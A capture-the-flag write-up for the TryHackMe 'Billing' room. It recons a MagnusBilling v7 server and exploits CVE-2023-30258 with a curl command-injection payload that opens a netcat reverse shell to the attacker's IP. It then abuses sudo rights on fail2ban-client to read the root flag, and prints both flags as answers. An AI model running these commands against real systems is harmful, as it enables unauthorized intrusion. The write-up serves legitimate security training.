# TryHackMe - Billing


### 🛠 Reco

Set an environment variable for the IP to simplify commands:

```bash
export IP=10.10.195.221
```
### 🔍 Nmap Scan

```bash
nmap -sC -sV -oN nmap/initial $IP
```

**Results:**

```
PORT     STATE SERVICE VERSION                                          
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u6 (protocol 2.0)    
| ssh-hostkey:                                                          
|   256 52:2b:de:2f:b9:58:4b:76:3f:da:75:d7:e6:6f:57:85 (ECDSA)         
|_  256 a0:95:5d:d9:ce:59:c1:0c:18:9c:ac:33:2f:2c:3a:5e (ED25519)       
80/tcp   open  http    Apache httpd 2.4.62 ((Debian))                   
| http-title:             MagnusBilling                                 
|_Requested resource was http://10.10.195.221/mbilling/                 
| http-robots.txt: 1 disallowed entry                                   
|_/mbilling/                                                            
|_http-server-header: Apache/2.4.62 (Debian)                            
3306/tcp open  mysql   MariaDB 10.3.23 or earlier (unauthorized)        
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel    
```

### mysql


Let's have a look at the mysql port first
```bash
telnet 10.10.195.221 3306
```
**Results:**
```
Trying 10.10.195.221...
Connected to 10.10.195.221.
Escape character is '^]'.
dHost 'ip-10-6-57-243.eu-west-1.compute.internal' is not allowed to connect to this MariaDB serverConnection closed by foreign host.
```

Nope

### 🔍 Gobuster

```bash
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://10.10.195.221 -x .php,.txt,.html | tee go_scan
```

**Results:**
```
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 278]
/.php                 (Status: 403) [Size: 278]
/index.php            (Status: 302) [Size: 1] [--> ./mbilling]
/robots.txt           (Status: 200) [Size: 37]
```
Gobuster found robots.txt. Let's take a look

**Results:**
```
User-agent: *
Disallow: /mbilling/
```

Just the mbilling page that index.php sends us to. Let's take a closwer look at that

### 🔍 mbilling

```bash
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://10.10.195.221/mbilling -x .php,.txt,.html,.md | tee mbilling_scan
```

**Results:**
```
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 278]
/.php                 (Status: 403) [Size: 278]
/index.html           (Status: 200) [Size: 30760]
/index.php            (Status: 200) [Size: 663]
/archive              (Status: 301) [Size: 325] [--> http://10.10.195.221/mbilling/archive/]
/resources            (Status: 301) [Size: 327] [--> http://10.10.195.221/mbilling/resources/]
/assets               (Status: 301) [Size: 324] [--> http://10.10.195.221/mbilling/assets/]
/lib                  (Status: 301) [Size: 321] [--> http://10.10.195.221/mbilling/lib/]
/README.md            (Status: 200) [Size: 1995]
/cron.php             (Status: 200) [Size: 0]
/LICENSE              (Status: 200) [Size: 7652]
/tmp                  (Status: 301) [Size: 321] [--> http://10.10.195.221/mbilling/tmp/]
/protected            (Status: 403) [Size: 278]
```
LICENSE  didn't give me anything but READEME.md provided the version of mbilling that is version 7. 


## 📌 Task 1: Flags

Note: Bruteforcing is out of scope for this room. hmmm


### Initial foothold


Searching for magnus 7 and exploit found lots of walk throughts of this box but I don't want to cheat. Adding github to my search revealed this repository with a straighforward exploit. Yes, I could have used metasploit but I prefer the manual way since metaspoloit is not allowed in OSCP.

https://github.com/tinashelorenzi/CVE-2023-30258-magnus-billing-v7-exploit

The command is very straight forward. Just set up a listener first (nc -nlpvp 999) and then execute the command

```bash
curl -s 'http://10.10.195.221/mbilling/lib/icepay/icepay.php' --get --data-urlencode 'democ=;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.6.57.243 9999 >/tmp/f;'
```

**Results:**
```bash
uid=1001(asterisk) gid=1001(asterisk) groups=1001(asterisk)
```
I am in as "asterisk". Let's get the user flag!

```bash
cat /home/magnus/user.txt

THM{4a6831d5f124b25eefb1e92e0f0da4ca}
```
**Q. What is the user.txt flag?
A. THM{4a6831d5f124b25eefb1e92e0f0da4ca}

```bash
sudo -l
```

**Results:**

```
Matching Defaults entries for asterisk on ip-10-10-239-115:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin                                      
                                                                        
Runas and Command-specific defaults for asterisk:                       
    Defaults!/usr/bin/fail2ban-client !requiretty                       
                                                                        
User asterisk may run the following commands on ip-10-10-239-115:       
    (ALL) NOPASSWD: /usr/bin/fail2ban-client
```

### Root

I googled around and found a good resource for fail2bin privesc - https://vulners.com/packetstorm/PACKETSTORM:189989

This script does a bunch of checks but we can just rip out the comands and run them in bash. While we could update the script to do a reverse shell, we only need the flag. So, let's keep this simple!

```bash
sudo /usr/bin/fail2ban-client restart
sudo /usr/bin/fail2ban-client set sshd action iptables-multiport actionban "/bin/bash -c 'cat /root/root.txt > /tmp/root.txt && chmod 777 /tmp/root.txt'"
sudo /usr/bin/fail2ban-client set sshd banip 127.0.0.1
```
That copied the flag!

```bash
cat /tmp/root.txt
```
**Results:**
```
THM{33ad5b530e71a172648f424ec23fae60}
```
**Q. What is the root.txt flag?
A. THM{33ad5b530e71a172648f424ec23fae60}
